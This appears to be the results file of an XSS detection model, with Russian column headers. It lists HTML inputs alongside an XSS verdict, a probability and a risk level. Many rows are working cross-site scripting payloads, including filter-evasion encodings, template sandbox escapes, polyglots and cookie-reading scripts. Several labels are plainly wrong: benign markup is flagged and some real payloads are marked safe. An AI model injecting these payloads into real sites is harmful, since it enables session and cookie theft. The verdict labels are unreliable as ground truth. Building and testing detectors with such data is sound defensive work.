Входная строка;XSS;Вероятность;Риск
%22-[9].every(alert)-%22//;True;83.63%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
Set.constructor`alert\x28document.domain\x29;True;89.75%;CRITICAL
%E5%98%8D%E5%98%8A%20<img src=1 onerror=alert(1)>;True;99.68%;CRITICAL
"<IMG SRC=""javascript:alert('XSS')""";True;98.49%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
<button>Read more</button>;False;28.28%;LOW
Ij48aW1nIHNyYz14IG9uZXJyb3I9cHJvbXB0KGRvY3VtZW50LmNvb2tpZSk7Pg==;True;37.13%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<p>About</p>;False;34.33%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<input type='text' name='field'>;False;29.42%;LOW
<input type='text' name='field'>;False;29.42%;LOW
'-alert(1)-';True;93.47%;CRITICAL
<isindex type=image src=1 onerror=alert(XSS)>;True;99.72%;CRITICAL
<x v-on:click='_b.constructor`alert(1)`()'>click</x>;True;77.11%;HIGH
<img onerror=a[%00]lert(1) src=a>;True;99.78%;CRITICAL
<div>Home</div>;False;25.75%;LOW
<plaintext onfocus=alert(1) autofocus tabindex=1>;True;99.69%;CRITICAL
"""><div onpointerrawupdate=""console.log('XSS')""></div><!--";True;94.11%;CRITICAL
<span class='class-924'>Services</span>;False;1.13%;SAFE
<p>About</p>;False;34.33%;LOW
"<video oncanplaythrough=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>";True;99.66%;CRITICAL
"<DIV STYLE=""width: expression(alert('XSS'));"">";True;71.52%;HIGH
"<a href=""  &#x8; &#23;   javascript:alert('Successful XSS')"">Click this link!</a>";False;0.40%;SAFE
<script>throw onerror=alert,1</script>;True;99.52%;CRITICAL
"<IMG+SRC=""jav#x0D;ascript:alert(1);"">";True;92.01%;CRITICAL
<img/ignored=()%0Asrc=x%0Aonerror=prompt(1)>;True;73.55%;HIGH
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<font style='color:expression(alert(1))'>;True;70.68%;HIGH
Search/Results?q=<img/src/onerror=alert(`test`)>;True;99.15%;CRITICAL
"('+'alert(1)+')();";True;94.94%;CRITICAL
"<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>";True;86.52%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"""jav&#x09;ascript:alert(1);"">";True;97.40%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
"""><svg+onload=alert&amp;#x26""1";True;99.49%;CRITICAL
"""><svg+onload=alert&amp;#x25""1";True;99.49%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<img src='image.jpg' alt='image'>;False;34.81%;LOW
%253Cscript%253Ealert(1)%253C/script%253E;True;91.00%;CRITICAL
<div>Home</div>;False;25.75%;LOW
<input type='text' name='field'>;False;29.42%;LOW
%0d%0aX-XSS-Protection:0%0d%0aContent-Type:%20text/html%0d%0a%0d%0a%3Chtml%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E%3C%21--;True;71.94%;HIGH
"""><svg onScroll=""javascript:alert(1)//";True;99.17%;CRITICAL
<div>Home</div>;False;25.75%;LOW
<button>Read more</button>;False;28.28%;LOW
<a href='/page'>Contact</a>;False;1.05%;SAFE
<input type='text' name='field'>;False;29.42%;LOW
"""><<script>alert(document.cookie);//<</script>";True;89.13%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
onmouseover=â€alert(â€˜XSSâ€™);True;99.39%;CRITICAL
"<style>@keyframes x{}</style><xss style=""animation-name:x"" onanimationstart=""alert(1)""></xss>";True;99.81%;CRITICAL
<h4>Login</h4>;False;27.98%;LOW
<input type='text' name='field'>;False;29.42%;LOW
onsubmit=â€alert(â€˜XSSâ€™);True;99.39%;CRITICAL
<h4>Login</h4>;False;27.98%;LOW
<input type='text' name='field'>;False;29.42%;LOW
<button>Read more</button>;False;28.28%;LOW
<xss onafterscriptexecute=alert(1)><script>1</script>;True;99.79%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<x @click='_b.constructor`alert(1)`()'>click</x>;True;72.99%;HIGH
<input type='text' name='field'>;False;29.42%;LOW
<html ontouchcancel=alert(1)>;True;99.68%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
%2527%2520onmouseover%253D%2527alert%25281%2529%2527%2520;True;79.99%;HIGH
<a href='/page'>Contact</a>;False;1.05%;SAFE
"<â€‹script type=""text/javascript"">javascriptâ€‹:alert(1);<â€‹/script>";True;81.20%;CRITICAL
"?query=""><img src=x onerror=prompt(document.domain);>";True;82.49%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<h4>Login</h4>;False;27.98%;LOW
<h4>Login</h4>;False;27.98%;LOW
"<DIV+STYLE=""background-image: url(javascript:alert(1))"">";True;85.69%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
<h6>Login</h6>;False;27.98%;LOW
<button>Read more</button>;False;28.28%;LOW
"<img \x00src=x onerror=""alert(1)"">";True;99.73%;CRITICAL
<span class='class-374'>Services</span>;False;1.13%;SAFE
"""><img src=x onerror=prompt(document['domain']);>.aspx";True;80.54%;CRITICAL
<span class='class-1054'>Services</span>;False;1.13%;SAFE
"""><svg+onload=alert&amp;#x98""1";True;99.49%;CRITICAL
"<BASE HREF=""javascript:alert('XSS');//"">";True;89.88%;CRITICAL
".alert(1);";True;87.20%;CRITICAL
"/?xss=500); alert(document.cookie);//";True;84.86%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
<a href='/page'>Contact</a>;False;1.05%;SAFE
<h6>Login</h6>;False;27.98%;LOW
onpointerover=â€alert(â€˜XSSâ€™);True;99.39%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
"{{!ready && (ready = true) && ( !call ? $$watchers[0].get(toString.constructor.prototype) : (a = apply) && (apply = constructor) && (valueOf = call) && (''+''.toString( 'F = Function.prototype;' + 'F.apply = F.a;' + 'delete F.a;' + 'delete F.valueOf;' + 'alert(1);' )));}}";True;50.39%;MEDIUM
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<div>Home</div>;False;25.75%;LOW
"<a href=""javascript:x='&percnt;27-alert(1)-%27';"">XSS</a>";False;5.20%;SAFE
<h6>Login</h6>;False;27.98%;LOW
"""><svg+onload=alert&amp;#x7C""1";True;99.49%;CRITICAL
"""><iframe/src=""javascript:alert(1%26%23x00000000000000000000000000029;""></iframe>";True;70.85%;HIGH
?&q&zzz%27onmou%3Cseover=1&ale%3Crt(%27xsp%27%3C)%3C%3B1%3B%20//;True;67.03%;HIGH
<button>Read more</button>;False;28.28%;LOW
\<a onmouseover=alert(document.cookie)\>xxs link\</a\>;True;99.23%;CRITICAL
"<<SCRIPT>alert(""XSS"");//\<</SCRIPT>";True;96.43%;CRITICAL
Wordfence 7.4.2;True;56.19%;MEDIUM
<h2>Login</h2>;False;27.98%;LOW
<a href='/page'>Contact</a>;False;1.05%;SAFE
"<img/src=""funny.jpg""onload=javascript:eval(alert('Successful&#32XSS'))>";True;98.06%;CRITICAL
"""<script>'confirm(0)%3B<%2Fscript>""";True;45.81%;MEDIUM
"<textarea><img title=""</textarea><img src onerror=alert(1)>""></textarea>";True;99.72%;CRITICAL
"test"",prompt%0A/*HelloWorld*/(document.domain) (working)- @Brutelogic";True;71.28%;HIGH
"<img src=""javascript:alert('XSS')"" alt=""Image"">";True;92.26%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
<div>Home</div>;False;25.75%;LOW
<span class='class-484'>Services</span>;False;1.13%;SAFE
"""><img src=x onerror=prompt(document.domain);<<";True;86.07%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
""" onclick=alert(1)//<button â€˜ onclick=alert(1)//> */ alert(1)//";True;99.24%;CRITICAL
"<FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>";True;89.61%;CRITICAL
"""><track/onerror='confirm`1`'>";True;69.67%;HIGH
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<a href='/page'>Contact</a>;False;1.05%;SAFE
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<span class='class-1164'>Services</span>;False;1.13%;SAFE
<input type='text' name='field'>;False;29.42%;LOW
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<div>Home</div>;False;25.75%;LOW
"""><svg+onload=alert&amp;#x6A""1";True;99.49%;CRITICAL
<audio src/onerror=alert(1)>;True;99.78%;CRITICAL
"<IMG+SRC=""jav&#x0A;ascript:alert(1);"">";True;90.61%;CRITICAL
"""><svg+onload=alert&amp;#x8C""1";True;99.49%;CRITICAL
"'\u0029\u0028};alert(document.cookie);//""";True;90.48%;CRITICAL
<p>About</p>;False;34.33%;LOW
'\u003e\'</b><script>alert(document.cookie)</script><b><!--';True;84.30%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<event-source src=javascript:alert(1)>;True;87.27%;CRITICAL
"<img onerror=a&#x6c;ert(1) src=a>";True;85.54%;CRITICAL
<script>throw/x/,onerror=Uncaught=eval,h=location.hash,e=Error,e.lineNumber=e.columnNumber=e.fileName=e.message=h[2]+h[1]+h,!!window.InstallTrigger?e:e.message</script>;True;89.85%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
%3F%20javascript:alert(1);True;96.21%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<button>Read more</button>;False;28.28%;LOW
""";eval(unescape(location))//#%0Aprompt(0)";True;86.04%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
<h6>Login</h6>;False;27.98%;LOW
<h4>Login</h4>;False;27.98%;LOW
</title><script>alert(document.domain)</script>;True;80.20%;CRITICAL
"""]<img src=1 onerror=confirm(1)>";True;79.18%;HIGH
<div>Home</div>;False;25.75%;LOW
<p>About</p>;False;34.33%;LOW
<button>Read more</button>;False;28.28%;LOW
<img src @error=this.alert(1)>;True;79.61%;HIGH
d1bvs%3c%2fscript%3e%3cscript%3ealert(`XSS`)%3c%2fscript%3ec579g;True;86.46%;CRITICAL
%27%22()%26%25%3Cyes%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E;True;79.92%;HIGH
<h4>Login</h4>;False;27.98%;LOW
<a href='/page'>Contact</a>;False;1.05%;SAFE
"""><svg+onload=alert&amp;#x16""1";True;99.49%;CRITICAL
"<xss draggable=""true"" ondragexit-alert()>test</xss>";True;82.57%;CRITICAL
"""><svg+onload=alert&amp;#x90""1";True;99.49%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"'&#x3E;'><script>alert(2);</script>";True;93.47%;CRITICAL
"<Video> <source onerror = ""javascript: alert (XSS)"">";True;99.77%;CRITICAL
<x onauxclick=import('//1152848220/')>click;True;72.10%;HIGH
"""><img src=x onerror=prompt&#x000000028;document&#x00000002E;domain&#x000000029;&#x00000003B;>";True;86.43%;CRITICAL
<h6>Login</h6>;False;27.98%;LOW
"<c/onpointerrawupdate=d=document,b=%27%60%27,d[%27loca%27%2B%27tion%27]=%27javascript%26colon;aler%27%2B%27t%27%2Bb%2Bdomain%2Bb>";True;96.38%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<h2>Login</h2>;False;27.98%;LOW
<p>About</p>;False;34.33%;LOW
<div>Home</div>;False;25.75%;LOW
<svg onload=alert(1)>;True;99.68%;CRITICAL
<div>Home</div>;False;25.75%;LOW
{{window['eval'](window['atob'](window['decodeURIComponent']('Ij48aW1nIHNyYz14IG9uZXJyb3I9cHJvbXB0KGRvY3VtZW50LmNvb2tpZSk7PjEy')))}};True;40.86%;MEDIUM
<span class='class-1324'>Services</span>;False;1.13%;SAFE
<button>Read more</button>;False;28.28%;LOW
<svg onx=() onload=(confirm)(1)>;True;88.41%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<h1 onfocus=alert(1) autofocus tabindex=1>;True;99.68%;CRITICAL
"&quot;&gt;&lt;svg onload=alert&amp;#x2F;&#x00000040&quot;1&quot;&gt;";True;99.18%;CRITICAL
"""><svg+onload=alert&amp;#x33""1";True;99.49%;CRITICAL
"""><svg+onload=alert&amp;#x85""1";True;99.49%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
[1].map(alert)   or    (alert)(1);False;1.50%;SAFE
"""><script>alert(document.cookie)</script>";True;82.55%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<script>alert('\u0031')</script>;True;93.97%;CRITICAL
<span class='class-1044'>Services</span>;False;1.13%;SAFE
<div>Home</div>;False;25.75%;LOW
"&#x27;&quot;&lt;img src=1 onerror=alert(1)&gt;&quot;&#x27;";True;99.61%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"1""--></script><svg/onload=';alert(document.domain);'>";True;98.28%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<a href=&#01javascript:alert(1)> -@brutelogic;False;5.81%;SAFE
test@example(<script>alert(0)</script>).com;True;82.88%;CRITICAL
<java contentEditable='' autofocus='' onfocus=location=tagName+innerHTML+location.hash>script:/*#*/alert(1);True;92.54%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<button>Read more</button>;False;28.28%;LOW
"""><img/src=x/onerro=6><img/src=""1""/onerror=alert(1);>?test=test";True;97.78%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"""><svg+onload=alert&amp;#x95""1";True;99.49%;CRITICAL
%u0025u0073u0063u0072u0069u0070u0074u003Ealert('XSS')%u003C%u002f%u0073%u0063%u0072%u0069%u0070%u0074%u003E;True;69.87%;HIGH
"<img src=`javascript:alert(""The name is 'XSS'"")`>";True;83.72%;CRITICAL
<body onmessage=print()>;True;73.70%;HIGH
<img src='image.jpg' alt='image'>;False;34.81%;LOW
PHN2Zy9vbmxvYWQ9J2FsZXJ0Jz4=;False;33.17%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
javascript:\\\/\\\/\\\'\\\/<\\\/title><\\\/style><\\\/textarea><\\\/script>--><p%22%20%0D%20%0A%20onclick%3Dalert(123)%2F%2F%3E*%2Falert()%2F*%3Cimg%20src%3Dx%20onerror%3Dalert(456)%2F%3E%3Csvg%2Fonload%3Dprompt(789)%2F%3E%3B\\\'%22%2F%2F%20%3A%3Bfn()%3B%0A%0D%0A%0D%0A%0D%0A%09{{12*12+\\\'Audi%20RS5\\\'.substr(0,4)}}XXX%3Cscript%3Ealert(\\\'XSS\\\');False;31.96%;LOW
"ABC<div style=""x:\xE3\x80\x80expression(javascript:alert(1)"">DEF";True;78.10%;HIGH
<div>Home</div>;False;25.75%;LOW
<span class='class-124'>Services</span>;False;1.13%;SAFE
<h6>Login</h6>;False;27.98%;LOW
%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3B%3E;True;81.14%;CRITICAL
<object onafterscriptexecute=confirm(0)>;True;90.15%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<script src=javascript:alert(1)>;True;52.84%;MEDIUM
<h2>Login</h2>;False;27.98%;LOW
<h6>Login</h6>;False;27.98%;LOW
<div>Home</div>;False;25.75%;LOW
<script x> alert(1) </script 1=2;True;66.62%;HIGH
"%20""><svg onload=alert(1)>";True;99.69%;CRITICAL
"""&amp;amp;gt;&amp;amp;lt;svg onload=alert(1)&amp;amp;gt;";True;99.33%;CRITICAL
"""><image/src/onerror=prompt(""XSS"")>";True;66.63%;HIGH
javascript:alert('1');True;96.79%;CRITICAL
<p>About</p>;False;34.33%;LOW
<button>Read more</button>;False;28.28%;LOW
<img src='image.jpg' alt='image'>;False;34.81%;LOW
"xxxxxxxxx'});}); </script><script>prompt (""PLEASE%20\nSUBSCRIBE"") </script>";True;74.46%;HIGH
<span class='class-1484'>Services</span>;False;1.13%;SAFE
<span class='class-764'>Services</span>;False;1.13%;SAFE
%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e;True;91.60%;CRITICAL
"""><svg+onload=alert&amp;#x7D""1";True;99.49%;CRITICAL
<h2>Login</h2>;False;27.98%;LOW
<button>Read more</button>;False;28.28%;LOW
"javascript:""/*'/*`/*\"" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=alert()//>javascript:""/*\""/*`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>";True;98.25%;CRITICAL
<h6>Login</h6>;False;27.98%;LOW
<a href='/page'>Contact</a>;False;1.05%;SAFE
<span class='class-1174'>Services</span>;False;1.13%;SAFE
secbreake@gmail.com\u003C/script\u003E\u003Cscript\u003Ealert(document.domain)//;True;87.26%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
<span class='class-4'>Services</span>;False;1.21%;SAFE
"""><svg onload=prompt(document.domain);>.php";True;82.49%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<div>Home</div>;False;25.75%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<span class='class-964'>Services</span>;False;1.13%;SAFE
<div>Home</div>;False;25.75%;LOW
<p>About</p>;False;34.33%;LOW
"""><svg+onload=alert&amp;#x10""1";True;99.49%;CRITICAL
<script>alert(1)</script>.php;True;84.83%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
%E5%98%8D%E5%98%8A%20javascript:alert(1);True;94.44%;CRITICAL
"<IMG SRC=javascript:alert(""XSS"")>";True;98.51%;CRITICAL
"><script>alert(123);</script x=";True;88.75%;CRITICAL
<img/src=xon=()onx+honerror=alert(1)>ss<svg/onload=prompt(document.domain)%20>;True;99.22%;CRITICAL
foo?q=foo<script>alert('xss')<%2fscript>;True;73.29%;HIGH
"""><audio onplay=alert(1);>";True;99.32%;CRITICAL
"""><A%20%252F=""""Href=%20JavaScript:k=%27a%27,top[k%2B%27lert%27](origin)>";True;73.96%;HIGH
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<span class='class-1374'>Services</span>;False;1.13%;SAFE
"""><svg+onload=alert&amp;#x11""1";True;99.40%;CRITICAL
"xss'""><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>";True;41.66%;MEDIUM
{{$on.constructor('alert(1)')()}};True;89.31%;CRITICAL
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>;True;98.34%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
<button autofocus onfocus=alert(1)>test</button>;True;99.84%;CRITICAL
<h6>Login</h6>;False;27.98%;LOW
<input type='text' name='field'>;False;29.42%;LOW
<scr%00ipt>prompt(1)</sc%00ript>;True;52.99%;MEDIUM
"""&amp;gt;&amp;lt;svg onload=alert(1)&amp;gt;";True;99.36%;CRITICAL
"""><div onpointerrawupdate=""console.log('XSS')"">Click_Here_Click_Here_Click_Here_Click_Here_Click_Here_Click_Here_Click_Here_ClickHere</div>";True;80.83%;CRITICAL
<h2>Login</h2>;False;27.98%;LOW
"xss""><!--><svg/onload=alert(document.domain)>";True;98.98%;CRITICAL
"""><a nope=""%26quot;x%26quot;""onmouseover=""Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))"">";True;94.32%;CRITICAL
"""><img src=x onerror=prompt(unescape('document%2Edomain'));>";True;82.88%;CRITICAL
<div>Home</div>;False;25.75%;LOW
"""&amp;amp;amp;amp;gt;&amp;amp;amp;amp;lt;svg onload=alert(1)&amp;amp;amp;amp;gt;";True;99.56%;CRITICAL
<p>About</p>;False;34.33%;LOW
"<iframe srcdoc=""&lt;img src=1 onerror=alert(1)&gt;""></iframe>";True;99.85%;CRITICAL
<p>About</p>;False;34.33%;LOW
<button>Read more</button>;False;28.28%;LOW
<p>About</p>;False;34.33%;LOW
<p>About</p>;False;34.33%;LOW
<a href='/page'>Contact</a>;False;1.05%;SAFE
<div>Home</div>;False;25.75%;LOW
<p>About</p>;False;34.33%;LOW
<p>About</p>;False;34.33%;LOW
"""&amp;amp;amp;gt;&amp;amp;amp;lt;img src=x onerror=prompt(document.domain);&amp;amp;amp;gt;";True;98.36%;CRITICAL
"<embed src=""data:image/svg+xml;>";True;40.97%;MEDIUM
<img  sr%00c=x o%00nerror=((pro%00mpt(1)))>;True;86.44%;CRITICAL
"""><svg+onload=alert&amp;#x2D""1";True;99.49%;CRITICAL
javascript:/*/*/**/**/**/*%0D%0A%0d%0a*//**/oNclick-alert())//</style/</title/</textarEa/</script/->\x3ciframe/<iframe/oNloAd-alert(1)//>\x3e;True;76.25%;HIGH
"blah(""""+new class b{toString=e=>location=name}+"""")</script>";True;99.09%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
PHN2ZyBvbmxvYWQ9YWxlcnQmYWxlcnQoMjMgKT4=;True;37.64%;LOW
"""><svg onload=alert(1)//";True;99.17%;CRITICAL
"<xss draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</xss>";True;99.82%;CRITICAL
<span class='class-1394'>Services</span>;False;1.13%;SAFE
"%0d%0a%20""><img src=x onerror=prompt(document.domain);>";True;83.74%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"<input/onmouseover=""javaSCRIPT&colon;confirm&lpar;1&rpar;""";True;71.46%;HIGH
"'`""><\x3Cscript>javascript:alert(1)</script>";True;85.21%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
<Script>alert()</Script>;True;80.56%;CRITICAL
<span class='class-474'>Services</span>;False;1.13%;SAFE
<a href='/page'>Contact</a>;False;1.05%;SAFE
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<a href='/page'>Contact</a>;False;1.05%;SAFE
<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>;True;52.82%;MEDIUM
<span class='class-454'>Services</span>;False;1.13%;SAFE
<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>;False;3.14%;SAFE
<script>alert(['X','S','S'].join(''))</script>;True;86.13%;CRITICAL
<p>About</p>;False;34.33%;LOW
"""><svg+onload=alert&amp;#x2E""1";True;99.49%;CRITICAL
<span class='class-234'>Services</span>;False;1.13%;SAFE
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<svg><image href=1 onerror=alert(1)>;True;99.85%;CRITICAL
"<a/href=javascript&colon;alert()>click";True;87.27%;CRITICAL
"""><img src=""/"" =_="" title=""onerror='prompt(1)'"">";True;55.63%;MEDIUM
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"""><svg+onload=alert&amp;#x1B""1";True;99.49%;CRITICAL
<span class='class-624'>Services</span>;False;1.13%;SAFE
<h6>Login</h6>;False;27.98%;LOW
<p>About</p>;False;34.33%;LOW
<Img Src=OnXSS OnError=prompt(document.cookie)>;True;85.71%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
"x""><svg%0Donload=""window['alert'](document['cookie'])""";True;93.58%;CRITICAL
"%E5%98%8D%E5%98%8A%20""><svg onload=alert(1)>";True;99.68%;CRITICAL
"""\""><script>'confirm(0)%3B<%2Fscript>"",";True;50.72%;MEDIUM
<script%20TEST>alert(1)</script%20TESTTEST>;True;76.58%;HIGH
"<details/open/ontoggle=""self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];""> - @xsspayloads";True;91.00%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
